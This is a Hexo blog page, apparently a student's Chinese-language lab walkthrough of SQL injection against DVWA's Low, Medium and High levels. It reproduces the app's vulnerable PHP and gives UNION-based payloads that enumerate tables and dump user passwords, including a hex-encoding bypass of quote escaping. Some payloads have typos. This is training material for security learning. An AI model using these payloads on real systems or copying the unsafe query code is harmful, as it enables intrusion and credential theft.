@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>DVWA 之SQL Injection | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言本文属于学习贴，我自己在学习的时候总结的，如有错误，请大家及时指出  dvwa v1.0.7  何为SQL injectionSQL injection 即SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入">
+<meta name="keywords" content="杂项,DVWA">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA 之SQL Injection">
+<meta property="og:url" content="http://yoursite.com/2019/10/04/DVWA 之SQL Injection/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言本文属于学习贴，我自己在学习的时候总结的，如有错误，请大家及时指出  dvwa v1.0.7  何为SQL injectionSQL injection 即SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502225219381.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502225332605.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502225422926.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502225441636.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502225511808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502225625703.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502225659845.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502225804750.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502230132800.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502230756923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502230846528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502230940249.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502231031420.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019050223112869.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502231653246.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502231912434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502232024370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502232110632.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019050223215556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502232304932.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502232356592.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502232540616.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502232612759.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190502232648220.png">
+<meta property="og:updated_time" content="2019-05-03T02:44:24.622Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DVWA 之SQL Injection">
+<meta name="twitter:description" content="前言本文属于学习贴，我自己在学习的时候总结的，如有错误，请大家及时指出  dvwa v1.0.7  何为SQL injectionSQL injection 即SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190502225219381.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-DVWA 之SQL Injection" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/DVWA 之SQL Injection/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.031Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web安全/">Web安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DVWA 之SQL Injection
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文属于学习贴，我自己在学习的时候总结的，如有错误，请大家及时指出</p>
+<blockquote>
+<p>dvwa v1.0.7</p>
+</blockquote>
+<h2 id="何为SQL-injection"><a href="#何为SQL-injection" class="headerlink" title="何为SQL injection"></a>何为SQL injection</h2><p><a href="https://baike.baidu.com/item/sql%E6%B3%A8%E5%85%A5/150289?fr=aladdin" target="_blank" rel="noopener">SQL injection</a> 即SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
+<h2 id="手工注入思路"><a href="#手工注入思路" class="headerlink" title="手工注入思路"></a>手工注入思路</h2><p>虽然sqlmap好用，但还是要掌握一些手工注入的思路。下面我们了解一下非盲注的步骤</p>
+<blockquote>
+<p>步骤来自FreeBuf.COM的lonehand</p>
+</blockquote>
+<ol>
+<li>判断是否存在注入，判断注入的类型是字符型还是数字型（因为判断注入主要是用这两种来判断的）</li>
+<li>猜解SQL查询语句的字段数</li>
+<li>确定显示的字段顺序</li>
+<li>获取数据库</li>
+<li>获取数据库的表</li>
+<li>获取表中的字段名</li>
+<li>拿到想要的数据</li>
+</ol>
+<h1 id="DVWA-sql注入进行学习"><a href="#DVWA-sql注入进行学习" class="headerlink" title="DVWA sql注入进行学习"></a>DVWA sql注入进行学习</h1><h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获取输入</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">	   <span class="comment">//执行sql命令</span></span><br><span class="line">    $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">	   <span class="comment">//返回结果</span></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123;			<span class="comment">//结果存在</span></span><br><span class="line">		<span class="comment">//将得到的结果保存在变量中</span></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line">        <span class="comment">//输出到界面</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><a href="http://www.w3school.com.cn/php/func_mysql_query.asp" target="_blank" rel="noopener">mysql_query()</a> 函数执行一条 MySQL 查询。<br><a href="http://www.w3school.com.cn/php/func_mysql_num_rows.asp" target="_blank" rel="noopener">mysql_num_rows()</a> 函数返回结果集中行的数目。<br><a href="http://www.w3school.com.cn/php/func_mysql_result.asp" target="_blank" rel="noopener">mysql_result()</a> 函数返回结果集中一个字段的值。  </p>
+<blockquote>
+<p>可以发现，没有任何的过滤和检查，可以直接构造sql 注入的命令。</p>
+</blockquote>
+<h2 id="Low-漏洞利用"><a href="#Low-漏洞利用" class="headerlink" title="Low 漏洞利用"></a>Low 漏洞利用</h2><ol>
+<li>判断是否存在注入，判断注入的类型是字符型还是数字型<br>先输入一些内容查看结果<br><img src="https://img-blog.csdnimg.cn/20190502225219381.png" alt="在这里插入图片描述"><br>测试是否存在注入<br>输入命令<code>1 and 1=1</code>,返回了正确的值。<br><img src="https://img-blog.csdnimg.cn/20190502225332605.png" alt="在这里插入图片描述"><br>输入命令 <code>1 and 1=2</code>,返回了正确的值。后台数据库没有处理我们输入的值，可能不存在数字型注入<br><img src="https://img-blog.csdnimg.cn/20190502225422926.png" alt="在这里插入图片描述"><br>输入命令<code>1&#39;and &#39;1&#39; = &#39;2</code> 没有返回值，可能存在注入。<br><img src="https://img-blog.csdnimg.cn/20190502225441636.png" alt="在这里插入图片描述"><br>输入命令<code>1’ or ‘1’ =’1</code> 查询成功。 不正常的结果返回，存在字符型注入<br><img src="https://img-blog.csdnimg.cn/20190502225511808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+<li>猜解SQL查询语句的字段数<br>使用order by 数字 从1依次递增去执行，发现命令错误时，则可以推出字段值<br>我们知道<code>1&#39; or 1=1</code> 执行时会报错的，而我们需要在字段超出的时候在报错，所以先构造一个会报错的命令：例如 <code>1&#39; and 1=1</code>，这是一个会报错的命令.<br><img src="https://img-blog.csdnimg.cn/20190502225625703.png" alt="在这里插入图片描述"><br>我们添加order by 到命令后,并注释,确保正确执行。<br><code>1&#39; and 1=1 order by 1 #</code><br><img src="https://img-blog.csdnimg.cn/20190502225659845.png" alt="在这里插入图片描述"><br>输入<code>1&#39; and 1=1 order by 2 #</code><br><img src="https://img-blog.csdnimg.cn/20190502225804750.png" alt="在这里插入图片描述"><br>输入<code>1&#39; and 1=1 order by 3 #``  
+说明执行的sql查询语句只有两个字段，  
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502225822295.png)  
+也可以使用union select 来查询字段，这样也可以获取字段
+输入</code>1’ and 1=1 union select 1,2 #<code>![在这里插入图片描述](https://img-blog.csdnimg.cn/20190502230020712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70)
+输入</code>1’ and 1=1 union select 1,2,3 #`<br><img src="https://img-blog.csdnimg.cn/20190502230132800.png" alt="在这里插入图片描述">  </li>
+<li>确定显示的字段顺序<br>如果使用order by 来获取的字段值，我们需要使用 <code>union select 1,2 #</code> 来获取字段的顺序，使用<code>union select</code> 就不需要这一步。<br>输入命令： <code>1’ union select 1,2 #</code><br><img src="https://img-blog.csdnimg.cn/20190502230756923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+<li>获取数据库<br>输入命令：<code>1’ union select 1,database() #</code><br><img src="https://img-blog.csdnimg.cn/20190502230846528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>获取到数据库：<code>dvwa</code></li>
+<li>获取数据库中的表<br>输入命令：<code>1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code><br><img src="https://img-blog.csdnimg.cn/20190502230940249.png" alt="在这里插入图片描述"><br>数据库中dvwa 有两个表，guestbook和users</li>
+<li>获取表中的字段名<br>输入命令：<code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &#39;users&#39; #</code><br><img src="https://img-blog.csdnimg.cn/20190502231031420.png" alt="在这里插入图片描述"><br>users有5个段,<code>user_id,first_name,last_name,user,password,avatar</code></li>
+<li>拿到想要的数据<br>输入命令：<code>1’ union select group_concat(user_id,first_name,last_name),group_concat(passwrod) from users #</code><br><img src="https://img-blog.csdnimg.cn/2019050223112869.png" alt="在这里插入图片描述"><br>这样就可以得到users表中的用户<code>user_id,first_name,last_name,password</code></li>
+</ol>
+<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id"</span>;</span><br><span class="line"></span><br><span class="line">    $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">        $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>过滤函数</strong>：<br><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">mysql_real_escape_string()</a> 函数转义 SQL 语句中使用的字符串中的特殊字符。\x00 、\n、 \r、&#39;、、”、\x1a，如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。<br><strong>相关函数</strong>：<br><a href="http://www.w3school.com.cn/php/func_mysql_num_rows.asp" target="_blank" rel="noopener">mysql_num_rows()</a> 函数返回结果集中行的数目。<br><a href="http://www.w3school.com.cn/php/func_mysql_query.asp" target="_blank" rel="noopener">mysql_query()</a> 函数执行一条 MySQL 查询。<br><a href="http://www.w3school.com.cn/php/func_mysql_result.asp" target="_blank" rel="noopener">mysql_result()</a> 函数返回结果集中一个字段的值。  </p>
+</blockquote>
+<h2 id="Medium-漏洞利用"><a href="#Medium-漏洞利用" class="headerlink" title="Medium 漏洞利用"></a>Medium 漏洞利用</h2><p>听说在有版本在前端成为下拉框，这里抓包修改包，绕过就好</p>
+<ol>
+<li><p>判断是否存在注入，判断注入的类型是字符型还是数字型（因为判断注入主要是用这两种来判断的）<br>输入命令：<code>1’ or ‘1’ =’1 #</code> 不是字符型注入，报错<br><img src="https://img-blog.csdnimg.cn/20190502231653246.png" alt="在这里插入图片描述"><br>输入命令：<code>1 or 1=1 #</code><br><img src="https://img-blog.csdnimg.cn/20190502231912434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>存在数字型注入，（刚刚的过滤函数过滤了常见的字符，但是由于是数字型注入，就没有作用了，这里不会使用到引号）  </p>
+</li>
+<li><p>猜解SQL查询语句的字段数<br>接下来就和low级别区别不大了，我们跳过基础讲解<br>输入命令：<code>1 or 1=1 order by 2 #</code><br><img src="https://img-blog.csdnimg.cn/20190502232024370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入命令：<code>输入 1 or 1=1 order by 3 #</code><br><img src="https://img-blog.csdnimg.cn/20190502232110632.png" alt="在这里插入图片描述">  </p>
+</li>
+<li><p>确定显示的字段顺序<br>输入命令：<code>1 union select 1,2 #</code><br><img src="https://img-blog.csdnimg.cn/2019050223215556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+<li><p>获取数据库<br>输入命令：<code>1 union select 1,database() #</code><br><img src="https://img-blog.csdnimg.cn/20190502232304932.png" alt="在这里插入图片描述"><br>数据库是dvwa</p>
+</li>
+<li><p>获取数据库的表<br>输入命令：<code>1 union select 1,group_concat(table_name) form information_schema.tables where table_schema = database() #</code><br><img src="https://img-blog.csdnimg.cn/20190502232356592.png" alt="在这里插入图片描述"><br>table 有 <code>guestbook</code> 和 <code>users</code></p>
+</li>
+<li><p>获取表中的字段名<br>输入命令：<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name = ‘users’ #</code><br>查询失败，引号被转义了<br><img src="https://img-blog.csdnimg.cn/20190502232540616.png" alt="在这里插入图片描述"><br>这里我们采用十六进制进行绕过,users 改为 0×7573657273 成功绕过<br><img src="https://img-blog.csdnimg.cn/20190502232612759.png" alt="在这里插入图片描述"><br>users表中有：user_id,first_name,last_name,password,avatar</p>
+</li>
+<li><p>拿到想要的数据<br>输入命令：<code>1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users</code><br><img src="https://img-blog.csdnimg.cn/20190502232648220.png" alt="在这里插入图片描述"><br>获取到users表中的所有用户的信息</p>
+</li>
+</ol>
+<h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Submit'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_numeric($id))&#123;</span><br><span class="line"></span><br><span class="line">        $getid = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id'"</span>;</span><br><span class="line">        $result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">        $i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,<span class="string">"first_name"</span>);</span><br><span class="line">            $last = mysql_result($result,$i,<span class="string">"last_name"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'ID: '</span> . $id . <span class="string">'&lt;br&gt;First name: '</span> . $first . <span class="string">'&lt;br&gt;Surname: '</span> . $last;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>过滤函数：</strong><br><a href="http://www.w3school.com.cn/php/func_string_stripslashes.asp" target="_blank" rel="noopener">stripslashes()</a> 函数删除由 addslashes() 函数添加的反斜杠。<br><a href="http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp" target="_blank" rel="noopener">mysql_real_escape_string()</a> 函数转义 SQL 语句中使用的字符串中的特殊字符。<br><a href="https://www.w3cschool.cn/php/php-is_numeric.html" target="_blank" rel="noopener">is_numeric()</a>— 检测变量是否为数字或数字字符串<br><strong>相关函数</strong><br><a href="http://www.w3school.com.cn/php/func_mysql_num_rows.asp" target="_blank" rel="noopener">mysql_num_rows()</a> 函数返回结果集中行的数目。<br><a href="http://www.w3school.com.cn/php/func_mysql_query.asp" target="_blank" rel="noopener">mysql_query()</a> 函数执行一条 MySQL 查询。<br><a href="http://www.w3school.com.cn/php/func_mysql_result.asp" target="_blank" rel="noopener">mysql_result()</a> 函数返回结果集中一个字段的值。</p>
+</blockquote>
+<blockquote>
+<p>大概讲一下，这个代码，判断了输入的id是否是数字类型，stripslasher()删除了addslashes()的函数添加的反斜杠，这样我就不会绕过了。查证之后，发现high级别开启了php的magic_quotes_gpc，所以这里只是告诉了我们怎么防止sql注入，能不能绕过，就看大佬们愿不愿意贡献自己的秘籍了。</p>
+</blockquote>
+<h2 id="解释疑点"><a href="#解释疑点" class="headerlink" title="解释疑点"></a>解释疑点</h2><p>为什么要加#</p>
+<blockquote>
+<p>#的作用是闭合引号，注释字符,比如我们输入命令<code>1’ union select 1,2 #</code>  这里1’会报错，是由于check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’’ at line 1，为了解决报错，我们需要加一个# 注释掉后面多余的引号。</p>
+</blockquote>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/web/120747.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之SQL Injection</a>  </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/DVWA 之SQL Injection/" data-id="ck1avz66g002dacv4jtjaz6aj" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DVWA/">DVWA</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂项/">杂项</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/04/Markdown语法介绍/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Markdown编辑器语法
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/04/DVWA 如何查看登录密码并修改/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">DVWA 查看默认密码</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB安全/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/sql注入/">sql注入</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/shell/">shell</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/实用技术/">实用技术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
